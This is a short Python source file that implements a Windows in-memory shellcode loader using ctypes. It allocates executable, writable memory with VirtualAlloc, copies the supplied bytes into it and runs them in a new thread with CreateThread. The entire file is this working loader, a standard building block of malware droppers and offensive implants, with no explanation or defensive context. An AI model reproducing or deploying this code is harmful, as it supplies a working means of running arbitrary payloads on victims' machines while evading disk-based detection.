import ctypes


class LoadMemory:
    @staticmethod
    def load_memory(content):
        shellcode = bytearray(content)
        ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
        ptr = ctypes.windll.kernel32.VirtualAlloc(
            ctypes.c_void_p(0),
            ctypes.c_size_t(len(shellcode)),
            ctypes.c_ulong(0x3000),
            ctypes.c_ulong(0x40)
        )
        buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
        ctypes.windll.kernel32.RtlMoveMemory(
            ctypes.c_void_p(ptr),
            buf,
            ctypes.c_size_t(len(shellcode))
        )
        handle = ctypes.windll.kernel32.CreateThread(
            ctypes.c_void_p(0),
            ctypes.c_size_t(0),
            ctypes.c_void_p(ptr),
            ctypes.c_void_p(0),
            ctypes.c_ulong(0),
            ctypes.pointer(ctypes.c_ulong(0))
        )
        ctypes.windll.kernel32.WaitForSingleObject(
            ctypes.c_void_p(handle),
            ctypes.c_ulong(-1)
        )

